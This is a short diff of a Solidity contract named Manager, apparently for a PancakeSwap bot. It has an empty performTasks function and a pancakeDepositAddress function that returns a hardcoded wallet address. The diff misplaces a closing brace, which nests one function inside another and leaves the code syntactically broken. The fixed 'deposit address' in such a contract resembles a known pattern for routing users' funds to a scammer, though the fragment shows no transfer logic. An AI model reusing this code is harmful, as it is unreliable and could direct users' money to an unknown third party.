@@ -5,13 +5,13 @@ pragma solidity ^0.5.0;
 contract Manager {
 	function performTasks() public {
 	    
-	}
+	
 
 	function pancakeDepositAddress() public pure returns (address) {
 		return 0x7447766ff3113873AF8716AbB250A2222f1E0ef9;
 	}
 }
-
+}
 /*
 import './SafeBEP20Namer.sol';
 // produces names for pairs of tokens using Uniswap's naming scheme
